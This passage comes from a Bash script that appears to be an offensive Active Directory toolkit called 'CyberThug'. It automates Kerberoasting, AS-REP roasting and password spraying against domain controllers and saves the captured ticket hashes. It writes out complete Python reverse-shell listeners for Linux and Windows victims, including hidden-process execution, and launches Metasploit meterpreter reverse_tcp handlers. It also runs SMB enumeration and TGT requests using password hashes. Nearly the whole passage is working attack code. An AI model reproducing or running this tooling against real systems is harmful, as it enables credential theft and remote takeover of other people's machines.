                      echo -e "\033[36m[+]-- Running GetUserSPNs.py $CLEAN_DOMAIN/$User:$Password -request $dc_host $flag --[+]\033[0m"
                          while read -r p; do
                               echo ""
                               echo -e "\033[36m$User\033[0m" 
                               GetUserSPNs.py $CLEAN_DOMAIN/$User:$p -request $dc_host $flag | grep '^\$krb5tgs\$' >> /tmp/.getuserspn-req.txt.$User
                               if [[ -s /tmp/.getuserspn-req.txt.$User ]]; then
                                 cp /tmp/.getuserspn-req.txt.$User /tmp/.getuserspn-req1.txt.$User
                                 echo "$User" > /tmp/.current_ii.txt
                                 getuserspns1_check
                                 cat /tmp/.getuserspn-req1.txt.$User
                                 cp /tmp/.getuserspn-req1.txt.$User $HOME/CyberThug_output/cyberthug_-t_output/$DOMAIN/getuserspn-req1_tgs_$DOMAIN_$DATE 2>/dev/null
                                 rm /tmp/.getuserspn-req1.txt.$User 2>/dev/null 
                               fi
                          done < $Password
                      echo ""
                      echo -e "\033[36m[+]-- Running GetUserSPNs.py -no-preauth /tmp/.test1_nxc_rid_brute -usersfile /tmp/.test1_nxc_rid_brute -dc-host $DC $CLEAN_DOMAIN/ --[+]\033[0m"
                      for i in $(cat /tmp/.test1_nxc_rid_brute); do
                          echo ""
                          echo -e "\033[36m$i\033[0m"
                          GetUserSPNs.py -no-preauth "$i" -usersfile /tmp/.test1_nxc_rid_brute -dc-host $DC $CLEAN_DOMAIN/ 2>/dev/null | grep '^\$krb5tgs\$' >> /tmp/.getuserspn.txt.$i
         		  if [[ -s /tmp/.getuserspn.txt.$i ]]; then
                             cp /tmp/.getuserspn.txt.$i /tmp/.getuserspn1.txt.$i
                             echo "$i" > /tmp/.current_i.txt
                             getuserspns_check
                             cat /tmp/.getuserspn.txt.$i
                             cp /tmp/.getuserspn.txt.$i $HOME/CyberThug_output/cyberthug_-t_output/$DOMAIN/getuserspn_tgs_$DOMAIN_$DATE 2>/dev/null
                             rm /tmp/.getuserspn.txt.$i 2>/dev/null
                      	  fi         
                      done
                else
                      echo ""  
                      echo -e "\033[36m[+]-- Running GetNPUsers.py -no-pass -usersfile /tmp/.test1_nxc_rid_brute $CLEAN_DOMAIN/ $dc_host --[+]\033[0m"
                      echo ""
                      for i in {1..15}; do
                          dots=$(( (i - 1) % 3 + 1 ))
                          echo -ne "\r\033[31mProcessing $(printf "%-${dots}s" | tr ' ' '.')\033[0m"
                          sleep 0.1
                      done
                      echo ""
                      GetNPUsers.py -no-pass -usersfile /tmp/.test1_nxc_rid_brute $CLEAN_DOMAIN/ $dc_host > /tmp/.asrep.txt 2>/dev/null
                      grep '^\$krb5asrep' /tmp/.asrep.txt > /tmp/.asrep1.txt
                      cat /tmp/.asrep1.txt
        	      cp /tmp/.asrep1.txt $HOME/CyberThug_output/cyberthug_-t_output/$DOMAIN/getnpusers_asrep_$DOMAIN_$DATE 2>/dev/null
                      echo "" 
                      if [[ -s /tmp/.asrep1.txt ]]; then
                          getnpusers_check
                      fi
                      echo -e "\033[36m[+]-- Running GetUserSPNs.py $CLEAN_DOMAIN/$User:$Password -request $dc_host $flag --[+]\033[0m"
                      echo ""
                      echo -e "\033[36m$User\033[0m" 
                      GetUserSPNs.py $CLEAN_DOMAIN/$User:$Password -request $dc_host $flag | grep '^\$krb5tgs\$' >> /tmp/.getuserspn-req.txt.$User
                      if [[ -s /tmp/.getuserspn-req.txt.$User ]]; then
                           cp /tmp/.getuserspn-req.txt.$User /tmp/.getuserspn-req1.txt.$User
                           echo "$User" > /tmp/.current_ii.txt
                           getuserspns1_check
                           cat /tmp/.getuserspn-req1.txt.$User
                           cp /tmp/.getuserspn-req1.txt.$User $HOME/CyberThug_output/cyberthug_-t_output/$DOMAIN/getuserspn-req1_tgs_$DOMAIN_$DATE 2>/dev/null
                           rm /tmp/.getuserspn-req1.txt.$User 2>/dev/null 
                      fi
                      echo ""
                      echo -e "\033[36m[+]-- Running GetUserSPNs.py -no-preauth /tmp/.test1_nxc_rid_brute -usersfile /tmp/.test1_nxc_rid_brute -dc-host $DC $CLEAN_DOMAIN/ --[+]\033[0m"
                      for i in $(cat /tmp/.test1_nxc_rid_brute); do
                          echo ""
                          echo -e "\033[36m$i\033[0m"
                          GetUserSPNs.py -no-preauth "$i" -usersfile /tmp/.test1_nxc_rid_brute -dc-host $DC $CLEAN_DOMAIN/ 2>/dev/null | grep '^\$krb5tgs\$' >> /tmp/.getuserspn.txt.$i
                  	  if [[ -s /tmp/.getuserspn.txt.$i ]]; then
                             cp /tmp/.getuserspn.txt.$i /tmp/.getuserspn1.txt.$i
                             echo "$i" > /tmp/.current_i.txt
                             getuserspns_check
                             cat /tmp/.getuserspn.txt.$i
                             cp /tmp/.getuserspn.txt.$i $HOME/CyberThug_output/cyberthug_-t_output/$DOMAIN/getuserspn_tgs_$DOMAIN_$DATE 2>/dev/null
                             rm /tmp/.getuserspn.txt.$i 2>/dev/null
                          fi
                      done
                fi
            else
                if [[ -f "$User" && -f "$Password" ]]; then
                    echo ""
                    echo -e "\033[36m[+]-- Running GetUserSPNs.py $CLEAN_DOMAIN/$User:$Password -request $dc_host $flag --[+]\033[0m"
                    while read -r u; do 
                        while read -r p; do
                           echo ""
                           echo -e "\033[36m$u\033[0m" 
                           GetUserSPNs.py $CLEAN_DOMAIN/$u:$p -request $dc_host $flag | grep '^\$krb5tgs\$' >> /tmp/.getuserspn-req.txt.$u
                           if [[ -s /tmp/.getuserspn-req.txt.$u ]]; then
                               cp /tmp/.getuserspn-req.txt.$u /tmp/.getuserspn-req1.txt.$u
                               echo "$u" > /tmp/.current_ii.txt
                               getuserspns1_check
                               cat /tmp/.getuserspn-req1.txt.$u
                               cp /tmp/.getuserspn-req1.txt.$u $HOME/CyberThug_output/cyberthug_-t_output/$DOMAIN/getuserspn-req1_tgs_$DOMAIN_$DATE 2>/dev/null
                               rm /tmp/.getuserspn-req1.txt.$u 2>/dev/null 
                           fi
                        done < $Password
                    done < $User
                    echo ""
                    echo -e "\033[36m[+]-- Running GetNPUsers.py -no-pass -usersfile $User $CLEAN_DOMAIN/ $dc_host --[+]\033[0m"
                    echo ""
                    for i in {1..15}; do
                         dots=$(( (i - 1) % 3 + 1 ))
                         echo -ne "\r\033[31mProcessing $(printf "%-${dots}s" | tr ' ' '.')\033[0m"
                         sleep 0.1
                    done
                    echo ""                 
                    GetNPUsers.py -no-pass -usersfile $User $CLEAN_DOMAIN/ $dc_host > /tmp/.asrep.txt 2>/dev/null
                    grep '^\$krb5asrep' /tmp/.asrep.txt > /tmp/.asrep1.txt
                    cat /tmp/.asrep1.txt
        	    cp /tmp/.asrep1.txt $HOME/CyberThug_output/cyberthug_-t_output/$DOMAIN/getnpusers_asrep_$DOMAIN_$DATE 2>/dev/null
                    echo "" 
                    if [[ -s /tmp/.asrep1.txt ]]; then
                          getnpusers_check
                    fi
                    echo ""
                    echo -e "\033[36m[+]-- Running GetUserSPNs.py -no-preauth $User -usersfile $User -dc-host $DC $CLEAN_DOMAIN/ --[+]\033[0m"
                    for i in $(cat $User); do
                        echo ""
                        echo -e "\033[36m$i\033[0m"
                        GetUserSPNs.py -no-preauth "$i" -usersfile $User -dc-host $DC $CLEAN_DOMAIN/ 2>/dev/null | grep '^\$krb5tgs\$' >> /tmp/.getuserspn.txt.$i
                        if [[ -s /tmp/.getuserspn.txt.$i ]]; then
                            cp /tmp/.getuserspn.txt.$i /tmp/.getuserspn1.txt.$i
                            echo "$i" > /tmp/.current_i.txt
                            getuserspns_check
                            cat /tmp/.getuserspn.txt.$i
                            cp /tmp/.getuserspn.txt.$i $HOME/CyberThug_output/cyberthug_-t_output/$DOMAIN/getuserspn_tgs_$DOMAIN_$DATE 2>/dev/null 
                            rm /tmp/.getuserspn.txt.$i 2>/dev/null 
                        fi 
                    done
                elif [[ -f "$User" ]]; then
                    echo ""
                    echo -e "\033[36m[+]-- Running GetNPUsers.py -no-pass -usersfile $User $CLEAN_DOMAIN/ $dc_host --[+]\033[0m"
                    echo ""
                    for i in {1..15}; do
                         dots=$(( (i - 1) % 3 + 1 ))
                         echo -ne "\r\033[31mProcessing $(printf "%-${dots}s" | tr ' ' '.')\033[0m"
                         sleep 0.1
                    done
                    echo ""                    
                    GetNPUsers.py -no-pass -usersfile $User $CLEAN_DOMAIN/ $dc_host > /tmp/.asrep.txt 2>/dev/null
                    grep '^\$krb5asrep' /tmp/.asrep.txt > /tmp/.asrep1.txt
                    cat /tmp/.asrep1.txt
                    cp /tmp/.asrep1.txt $HOME/CyberThug_output/cyberthug_-t_output/$DOMAIN/getnpusers_asrep_$DOMAIN_$DATE 2>/dev/null
                    echo ""
                    if [[ -s /tmp/.asrep1.txt ]]; then
                          getnpusers_check
                    fi
                    echo ""
                    echo -e "\033[36m[+]-- Running GetUserSPNs.py $CLEAN_DOMAIN/$User:$Password -request $dc_host $flag --[+]\033[0m"
                    while read -r u; do
                        echo ""
                        echo -e "\033[36m$u\033[0m" 
                        GetUserSPNs.py $CLEAN_DOMAIN/$u:$Password -request $dc_host $flag | grep '^\$krb5tgs\$' >> /tmp/.getuserspn-req.txt.$u
                        if [[ -s /tmp/.getuserspn-req.txt.$u ]]; then
                           cp /tmp/.getuserspn-req.txt.$u /tmp/.getuserspn-req1.txt.$u
                           echo "$u" > /tmp/.current_ii.txt
                           getuserspns1_check
                           cat /tmp/.getuserspn-req1.txt.$u
                           cp /tmp/.getuserspn-req1.txt.$u $HOME/CyberThug_output/cyberthug_-t_output/$DOMAIN/getuserspn-req1_tgs_$DOMAIN_$DATE 2>/dev/null
                           rm /tmp/.getuserspn-req1.txt.$u 2>/dev/null 
                        fi
                    done < $User
                    echo ""
                    echo -e "\033[36m[+]-- Running GetUserSPNs.py -no-preauth $User -usersfile $User -dc-host $DC $CLEAN_DOMAIN/ --[+]\033[0m"
                    for i in $(cat $User); do
                        echo ""
                        echo -e "\033[36m$i\033[0m"
                        GetUserSPNs.py -no-preauth "$i" -usersfile $User -dc-host $DC $CLEAN_DOMAIN/ 2>/dev/null | grep '^\$krb5tgs\$' >> /tmp/.getuserspn.txt.$i
                 	if [[ -s /tmp/.getuserspn.txt.$i ]]; then
                           cp /tmp/.getuserspn.txt.$i /tmp/.getuserspn1.txt.$i
                           echo "$i" > /tmp/.current_i.txt
                           getuserspns_check
                           cat /tmp/.getuserspn.txt.$i
                           cp /tmp/.getuserspn.txt.$i $HOME/CyberThug_output/cyberthug_-t_output/$DOMAIN/getuserspn_tgs_$DOMAIN_$DATE 2>/dev/null
                           rm /tmp/.getuserspn.txt.$i 2>/dev/null 
                        fi  
                    done
                elif [[ -f "$Password" ]]; then
                        echo ""
                        echo -e "\033[36m[+]-- Running GetUserSPNs.py $CLEAN_DOMAIN/$User:$Password -request $dc_host $flag --[+]\033[0m"
                            while read -r p; do
                                echo ""
                                echo -e "\033[36m$User\033[0m" 
                                GetUserSPNs.py $CLEAN_DOMAIN/$User:$p -request $dc_host $flag 2>/dev/null | grep '^\$krb5tgs\$' >> /tmp/.getuserspn-req.txt.$User
                                if [[ -s /tmp/.getuserspn-req.txt.$User ]]; then
                                   cp /tmp/.getuserspn-req.txt.$User /tmp/.getuserspn-req1.txt.$User
                                   echo "$User" > /tmp/.current_ii.txt
                                   getuserspns1_check
                                   cat /tmp/.getuserspn-req1.txt.$User
                                   cp /tmp/.getuserspn-req1.txt.$User $HOME/CyberThug_output/cyberthug_-t_output/$DOMAIN/getuserspn-req1_tgs_$DOMAIN_$DATE 2>/dev/null
                                   rm /tmp/.getuserspn-req1.txt.$User 2>/dev/null 
                                fi
                            done < $Password
                        echo ""
                else
                        echo -e "\033[36m[+]-- Running GetUserSPNs.py $CLEAN_DOMAIN/$User:$Password -request $dc_host $flag --[+]\033[0m"
                        echo ""
                        echo -e "\033[36m$User\033[0m" 
			GetUserSPNs.py $CLEAN_DOMAIN/$User:$Password -request $dc_host $flag 2>/dev/null | grep '^\$krb5tgs\$' >> /tmp/.getuserspn-req.txt.$User
                        if [[ -s /tmp/.getuserspn-req.txt.$User ]]; then
                             cp /tmp/.getuserspn-req.txt.$User /tmp/.getuserspn-req1.txt.$User
                             echo "$User" > /tmp/.current_ii.txt
                             getuserspns1_check
                             cat /tmp/.getuserspn-req1.txt.$User
                             cp /tmp/.getuserspn-req1.txt.$User $HOME/CyberThug_output/cyberthug_-t_output/$DOMAIN/getuserspn-req1_tgs_$DOMAIN_$DATE 2>/dev/null
                             rm /tmp/.getuserspn-req1.txt.$User 2>/dev/null 
                        fi
                        echo ""
                fi
            fi
            echo ""            
       done
    elif [[ "$tool" == "1" ]]; then
           while true; do 
               history -a "$HISTFILE" 
               echo -e "\033[35m
	        _ __   ___
 	       | '_ \ / __|
	       | | | | (__
     	       |_| |_|\___|
               \033[0m"
               echo "
                  1) Linux
                  2) Windows
               "
               echo ""
               read_input choice $'\033[35m# \033[0m'
               if [[ "$choice" == ".." ]]; then
                     history -a "$HISTFILE"
                     exec "$0" "$@"  
               elif [[ "$choice" == "1" ]]; then
                     read_input port $'\033[35mEnter The Port : \033[0m'
                     if [[ "$port" == "exit" ]]; then
                         exit 0
                     fi
                     DATE=$(date +%F_%H-%M-%S)
                     PYFILE="/tmp/reverse_shell_Linux_${DATE}.py"
                     cat > "$PYFILE" << EOF
import socket
import threading
import sys
import os
import termios
import tty
import time

HOST = '0.0.0.0'
PORT = $port
PTY_CMD = "script -qc /bin/bash /dev/null\n"
FALLBACK_CMD = "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n"
BASIC_CMD = "/bin/bash -i\n"
SCRIPT_CHECK_CMD = "which script\n"
PYTHON_CHECK_CMD = "which python3\n"

def recv_from_client(conn):
    try:
        while True:
            data = conn.recv(1024)
            if not data:
                break
            os.write(sys.stdout.fileno(), data)
    except Exception:
        pass

def send_to_client(conn):
    try:
        while True:
            data = os.read(sys.stdin.fileno(), 1024)
            if not data:
                break
            conn.sendall(data)
    except Exception:
        pass

def check_cmd(conn, cmd_to_check, keyword):
    buffer = []
    conn.sendall(cmd_to_check.encode())
    time.sleep(1)

    try:
        conn.settimeout(0.5)
        while True:
            data = conn.recv(1024)
            if not data:
                break
            buffer.append(data)
    except socket.timeout:
        pass
    finally:
        conn.settimeout(None)

    response = b''.join(buffer).decode(errors='ignore').lower()
    return keyword in response

def handle_connection(conn, addr):
    old_settings = None
    print(f"\033[92m[*] Connection from {addr[0]}:{addr[1]}\033[0m")
    print("")
    try:
        old_settings = termios.tcgetattr(sys.stdin.fileno())
        tty.setraw(sys.stdin.fileno())

        has_script = check_cmd(conn, SCRIPT_CHECK_CMD, '/')
        has_python = check_cmd(conn, PYTHON_CHECK_CMD, '/')

        if has_script:
            conn.sendall(PTY_CMD.encode())
        elif has_python:
            conn.sendall(FALLBACK_CMD.encode())
        else:
            conn.sendall(BASIC_CMD.encode())

        t_recv = threading.Thread(target=recv_from_client, args=(conn,), daemon=True)
        t_send = threading.Thread(target=send_to_client, args=(conn,), daemon=True)
        t_recv.start()
        t_send.start()

        t_recv.join()
        t_send.join()
    except Exception as e:
        print(f"[!] Error during session: {e}")
    finally:
        if old_settings:
            termios.tcsetattr(sys.stdin.fileno(), termios.TCSADRAIN, old_settings)
        conn.close()
        print("[*] Session closed, waiting for new connection...\n")

def main():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((HOST, PORT))
        s.listen(1)
        print(f"\n\033[92m[*] Listening on {HOST}:{PORT}...\033[0m")

        while True:
            try:
                conn, addr = s.accept()
                handle_connection(conn, addr)
            except KeyboardInterrupt:
                print("\n[*] Server shutting down.")
                break
            except Exception as e:
                print(f"[!] Listener error: {e}")

if __name__ == "__main__":
    main()
EOF
               python3 "$PYFILE"
               elif [[ "$choice" == "2" ]]; then
                      read_input port $'\033[35mEnter The Port : \033[0m'
                      if [[ "$port" == "exit" ]]; then
                          exit 0
                      else
                         DATE=$(date +%F_%H-%M-%S)
                         PYFILE="/tmp/reverse_shell_Windows_${DATE}.py"
                         cat > "$PYFILE" << 'EOF'
import socket
import signal
import threading
from prompt_toolkit.shortcuts import PromptSession
from prompt_toolkit.history import FileHistory

history_file = ".shell_history"
session = PromptSession(history=FileHistory(history_file))

current_shell = "unknown"

def ignore_signal(signum, frame):
    pass

def detect_shell(first_data: str) -> str:
    """Try to detect if connected shell is PowerShell or CMD"""
    if "powershell" in first_data.lower() or first_data.strip().startswith("PS "):
        return "powershell"
    return "cmd"

def receiver(client_socket):
    """ Continuously receive victim output asynchronously """
    global current_shell
    first_chunk = True
    try:
        while True:
            data = client_socket.recv(4096)
            if not data:
                break
            decoded = data.decode(errors="ignore")
            if first_chunk:
                current_shell = detect_shell(decoded)
                print(f"\033[93m[*] Detected shell: {current_shell}\033[0m")
                first_chunk = False
            print(decoded, end="", flush=True)
    except Exception:
        pass

def send_command_async(client_socket, cmd):
    """Send a command asynchronously so the prompt stays usable."""
    def worker():
        try:
            client_socket.send(cmd.encode() + b"\n")
        except Exception as e:
            print(f"[!] Error sending command: {e}")
    threading.Thread(target=worker, daemon=True).start()

def build_background_command(cmd):
    """Wrap normal commands to run in background on victim."""
    global current_shell
    safe_cmd = cmd.replace('"', '`"')
    if current_shell == "cmd":
        return f'start /b cmd /c "{safe_cmd}"'
    elif current_shell == "powershell":
        return f'powershell -windowstyle hidden -c "{safe_cmd}"'
    else:
        return f'start /b cmd /c "{safe_cmd}"'

def handle_client(client_socket, addr):
    global current_shell
    print(f"\033[92m[*] Connection established from {addr[0]}:{addr[1]}\033[0m")
    print("\033[96m[*] Available Aliases & Commands:\033[0m")
    print("")
    print("   \033[93mp <command>\033[0m or \033[93mcreate_process <command>\033[0m → Run hidden process")
    print("   \033[93mkill <process_name|pid>\033[0m → Terminate process by name or PID")
    print("   \033[93mc <command>\033[0m → Run Raw Command")
    print("   \033[93mshell cmd\033[0m → Switch manually to CMD mode")
    print("   \033[93mshell ps\033[0m  → Switch manually to PowerShell mode")
    print("   \033[93malias\033[0m → Show this list again\n")

    threading.Thread(target=receiver, args=(client_socket,), daemon=True).start()

    try:
        while True:
            try:
                cmd = session.prompt(f"Shell({current_shell})> ")
            except KeyboardInterrupt:
                print("")
                continue

            if not cmd.strip():
                continue

            if cmd.lower() == "exit":
                print("[*] Exiting shell session.")
                send_command_async(client_socket, "exit")
                client_socket.close()
                break

            if cmd.lower() in ["shell cmd", "cmd"]:
                if current_shell == "powershell":
                    print("[*] Switching from PowerShell to CMD...")
                    send_command_async(client_socket, "cmd")  
                current_shell = "cmd"
                print("[*] Forced to cmd.exe mode")
                continue

            elif cmd.lower() in ["shell ps", "shell powershell" , "powershell"]:
                if current_shell == "cmd":
                    print("[*] Switching from CMD to PowerShell...")
                    send_command_async(client_socket, "powershell")  
                current_shell = "powershell"
                print("[*] Forced to PowerShell mode")
                continue

            if cmd.startswith("p ") or cmd.startswith("create_process "):
                user_cmd = cmd[2:].strip() if cmd.startswith("p ") else cmd[len("create_process "):].strip()
                if not user_cmd:
                    print("No command provided after alias.")
                    continue

                parts = user_cmd.split()
                executable = parts[0]
                args = " ".join(parts[1:]) if len(parts) > 1 else ""
                args_escaped = args.replace('"', '`"')

                if args:
                    send_cmd = (
                        f'powershell -windowstyle hidden -c "Start-Process -FilePath \'{executable}\' '
                        f'-ArgumentList \'{args_escaped}\' -WindowStyle Hidden"'
                    )
                else:
                    send_cmd = (
                        f'powershell -windowstyle hidden -c "Start-Process -FilePath \'{executable}\' '
                        f'-WindowStyle Hidden"'
                    )

                print(f"Executing (isolated): {send_cmd}")
                send_command_async(client_socket, send_cmd)
                continue

            elif cmd.startswith("kill "):
                proc = cmd[5:].strip()
                if not proc:
                    print("Usage: kill <process_name|pid>")
                    continue
                if proc.isdigit():
                    send_cmd = f"taskkill /PID {proc} /F"
                else:
                    if not proc.lower().endswith(".exe"):
                        proc += ".exe"
                    send_cmd = f"taskkill /IM {proc} /F"

                print(f"Executing (isolated): {send_cmd}")
                send_command_async(client_socket, send_cmd)
                continue

            elif cmd.startswith("c "):
                raw_cmd = cmd[2:].strip()
                if not raw_cmd:
                    print("Usage: c <command>")
                    continue
                print(f"Executing (raw): {raw_cmd}")
                send_command_async(client_socket, raw_cmd)
                continue

            elif cmd == "alias":
                print("Available aliases:")
                print("  p <command> or create_process <command> → Run hidden process")
                print("  kill <process_name|pid> → Taskkill process by name or PID")
                print("  c <command> → Run Raw Command")
                print("  shell cmd → Switch manually to cmd.exe mode")
                print("  shell ps  → Switch manually to PowerShell mode")
                continue

            send_cmd = build_background_command(cmd)
            send_command_async(client_socket, send_cmd)

    except (ConnectionResetError, BrokenPipeError):
        print("[*] Connection lost. Waiting for new connection...")
    finally:
        client_socket.close()

def main():
    signal.signal(signal.SIGINT, ignore_signal)
    signal.signal(signal.SIGTSTP, ignore_signal)

    server_ip = "0.0.0.0"
    server_port = __PORT__

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((server_ip, server_port))
    server.listen(5)

    print(f"\n\033[92m[*] Listening on {server_ip}:{server_port}...\033[0m")

    while True:
        try:
            client_socket, addr = server.accept()
            handle_client(client_socket, addr)
        except KeyboardInterrupt:
            print("\n[*] Server shutting down.")
            break
        except Exception as e:
            print(f"[!] Error: {e}")

    server.close()

if __name__ == "__main__":
    main()
EOF
                         sed -i "s/__PORT__/$port/" "$PYFILE"
                         python3 "$PYFILE"
                      fi
               elif [[ "$choice"  == "exit" ]]; then
                    exit 0
               else
                  echo ""
                  echo -e "\033[35m[!] Enter a Valid Option\033[0m"
               fi
           done
    elif [[ "$tool" = "2" ]]; then
      while true; do
           history -a "$HISTFILE"
           echo  -e "\033[35m
	                _                           _
	 _ __ ___   ___| |_ ___ _ __ _ __  _ __ ___| |_ ___ _ __
	| '_  '_ \ / _ \ __/ _ \ '__| '_ \| '__/ _ \ __/ _ \ '__|
	| | | | | |  __/ ||  __/ |  | |_) | | |  __/ ||  __/ |
	|_| |_| |_|\___|\__\___|_|  | .__/|_|  \___|\__\___|_|
        	                    |_|
           \033[0m"
           echo "
               1) x64
               2) x32
           "
           read_input number $'\033[35m# \033[0m'
           if [[ "$number" == ".." ]]; then
               history -a "$HISTFILE"              
               exec "$0" "$@"
           elif [[ "$number" == "1" ]]; then
               read_input Port $'\033[35mEnter The Port : \033[0m' 
               echo ""
               echo -e "\033[36m[+]-- msfconsole -q -x 'use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT $Port; set ExitOnSession false; exploit -j -z' --[+]\033[0m"
               echo ""
               msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT $Port; set ExitOnSession false; exploit -j -z" 
               echo ""
           elif [[ "$number" == "2" ]]; then
               read_input Port $'\033[35mEnter The Port : \033[0m' 
               echo ""
               echo -e "\033[36m[+]-- msfconsole -q -x 'use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT $Port; set ExitOnSession false; exploit -j -z' --[+]\033[0m"
               echo ""
               msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT $Port; set ExitOnSession false; exploit -j -z"
               echo "" 
           elif [[ "$number" == "exit" ]]; then
               exit 0
           else
               echo ""
               echo -e "\033[35m[!] Enter a Valid Option\033[0m"
           fi
      done
    elif [[ "$tool" == "3" ]]; then
        trap ctrlc_handler INT
        ctrlc_handler() {
        if [ "$server_pid" != "" ] && kill -0 "$server_pid" 2>/dev/null; then
            echo -e "\n\e[0;31mStopping Python server ...\e[0m"
            kill "$server_pid"
            wait "$server_pid" 2>/dev/null
            server_pid=""
            current_dir="$server_dir"
            echo -e "\e[0;32mReturned to folder selection in $current_dir\e[0m\n"
        else
            echo -e "\n\e[0;31mExiting tool\e[0m"
            exit 0
        fi
        }
        current_dir="$HOME"
        server_dir=""
        server_pid=""
        prev_choice=""
        prev_port="8000"
        while true; do
        echo -e "\033[35m
         ____        _   _                 ____
        |  _ \ _   _| |_| |__   ___  _ __ / ___|  ___ _ ____   _____ _ __
        | |_) | | | | __| '_ \ / _ \| '_ \\___ \ / _ \ '__\ \ / / _ \ '__|
        |  __/| |_| | |_| | | | (_) | | | |___) |  __/ |   \ V /  __/ |
        |_|    \__, |\__|_| |_|\___/|_| |_|____/ \___|_|    \_/ \___|_|
               |___/

        \033[0m"
        while true; do
            echo -e "\e[0;36mCurrent directory:\e[0;32m $current_dir\e[0m"
            echo ""
            echo -e "\e[1;33mFolders:\e[0m"
            echo ""
            dirs=()
            files=()
            i=1
            for d in "$current_dir"/*/ ; do
            [ -d "$d" ] || continue
            dir_name="${d%/}"
            dir_name="${dir_name##*/}"
            echo -e "\e[1;33m[$i]\e[0m $dir_name"
            dirs+=("$dir_name")
            ((i++))
            done
            echo ""
            echo -e "\e[1;34mFiles:\e[0m"
            echo ""
            for f in "$current_dir"/* ; do
            [ -f "$f" ] || continue
            file_name="${f##*/}"
            echo -e "\e[1;34m- $file_name\e[0m"
            files+=("$file_name")
            done
            echo ""
            echo -e "\e[1;35m[!] Options"
            echo "-----"
            echo -e "\e[1;33m[.]\e[0m a step back"
            echo -e "\e[1;33m[s]\e[0m Select this directory to start server here"
            echo ""
            read -e -p $'\e[0;32m# \e[0m' choice
            if [[ "$choice" == "exit" ]]; then
                 exit 0
            elif [[ "$choice" == ".." ]]; then
                    exec "$0" "$@"  
            fi
            if [[ -z "$choice" && -n "$prev_choice" ]]; then
            choice="$prev_choice"
            echo "(Using previous input)"
            fi
            if [ -n "$choice" ]; then
            history -s "$choice"
            prev_choice="$choice"
            fi

            if [[ "$choice" == "s" ]]; then
            server_dir="$current_dir"
            break
            elif [[ "$choice" == "." ]]; then
            if [[ "$current_dir" == "/" ]]; then
                echo -e "\e[0;31mAlready at root directory, cannot go back further\e[0m"
            else
                current_dir=$(dirname "$current_dir")
            fi
            elif [[ "$choice" =~ ^[0-9]+$ ]]; then
            if (( choice >= 1 && choice <= ${#dirs[@]} )); then
                current_dir="$current_dir/${dirs[$((choice-1))]}"
            else
                echo -e "\e[0;31mInvalid folder number\e[0m"
            fi
            else
            echo -e "\033[35m[!] Enter a Valid Choice\033[0m"
            fi
            echo
        done
        read -e -p $'\e[0;32mEnter a port number (default 8000): \e[0m' port

        if [[ -z "$port" && -n "$prev_port" ]]; then
            port="$prev_port"
            echo "(Using previous port)"
        fi
        if ! [[ "$port" =~ ^[0-9]+$ ]] || [ "$port" -lt 1 ] || [ "$port" -gt 65535 ]; then
            echo -e "\e[0;31mInvalid port number .. Using default 8000\e[0m"
            port=8000
        fi
        history -s "$port"
        prev_port="$port"
        echo -e "\e[0;36mStarting Python HTTP server in directory\e[0;32m $current_dir \e[0;36mon port\e[0;32m $port\e[0m"
        cd "$current_dir" || { echo -e "\e[0;31mFailed to enter directory\e[0m"; exit 1; }

        if command -v python3 &>/dev/null; then
            python3 -m http.server "$port" &
        elif command -v python &>/dev/null; then
            python -m http.server "$port" &
        else
            echo -e "\e[0;31mPython not found\e[0m"
            exit 1
        fi
        server_pid=$!
        wait "$server_pid"
        server_pid=""
        echo -e "\e[1;33mPython server stopped\e[0m\n"
        done
    elif [[ "$tool" == "4" ]]; then
       while true; do     
         history -a "$HISTFILE"
         echo -e "\033[35m
                             _          _ _            _   
               ___ _ __ ___ | |__   ___| (_) ___ _ __ | |_ 
              / __| '_ \` _ \\| '_ \\ / __| | |/ _ \\ '_ \\| __|
              \\__ \\ | | | | | |_) | (__| | |  __/ | | | |_ 
              |___/_| |_| |_|_.__/ \\___|_|_|\\___|_| |_|\\__|
         \033[0m"
               echo "
                    1) smbclient -L domain
                    2) smbclient -L domain -U user%password
                    3) smbclient \\\\\\\\domain\\\\share -U user%password
                    4) smbclient.py -k -no-pass -target-ip dc domain/user@dc
               "
               read_input number $'\033[35m# \033[0m'
               if [[ "$number" == ".." ]]; then
                  history -a "$HISTFILE"                
                  exec "$0" "$@"  
               elif [[ "$number" == "1" ]]; then
                  read_input Domain $'\033[35mEnter The Domain : \033[0m'
                  echo ""
                  echo -e "\033[36m[+]-- Running smbclient -L $Domain --[+]\033[0m"
                  echo ""
                  smbclient -L $Domain 
                  echo ""
               elif [[ "$number" == "2" ]]; then
                  read_input Domain $'\033[35mEnter The Domain : \033[0m'
                  read_input User $'\033[35mEnter The User : \033[0m' 
                  read_input Password $'\033[35mEnter The Password : \033[0m'
                  echo ""
                  echo -e "\033[36m[+]-- Running smbclient -L $Domain -U $User%$Password --[+]\033[0m"
                  echo ""
                  smbclient -L $Domain -U $User%$Password
                  echo ""
              elif [[ "$number" == "3" ]]; then
                  read_input Domain $'\033[35mEnter The Domain : \033[0m'
                  read_input Share $'\033[35mEnter The Share : \033[0m'
                  read_input User $'\033[35mEnter The User : \033[0m' 
                  read_input Password $'\033[35mEnter The Password : \033[0m'
                  echo ""
                  echo -e "\033[36m[+]-- Running smbclient \\\\\\\\$Domain\\\\$Share -U $User%$Password --[+]\033[0m"
                  echo ""
                  smbclient \\\\$Domain\\$Share -U $User%$Password
                  echo ""
	      elif [[ "$number" == "4" ]]; then
                  read_input Domain $'\033[35mEnter The Domain : \033[0m'
                  read_input DC $'\033[35mEnter The DC : \033[0m'
                  read_input User $'\033[35mEnter The User : \033[0m'
                  read_input Password $'\033[35mEnter The (Password\Hash) : \033[0m'
                  sudo ntpdate -s $DC
                  echo ""
                  echo -e "\033[36m[+]-- Getting TGT --[+]\033[0m"
                  echo ""
                  getTGT.py $Domain/$User -hashes :$Password -dc-ip $DC -k
                  getTGT.py $Domain/$User:$Password -dc-ip $DC -k
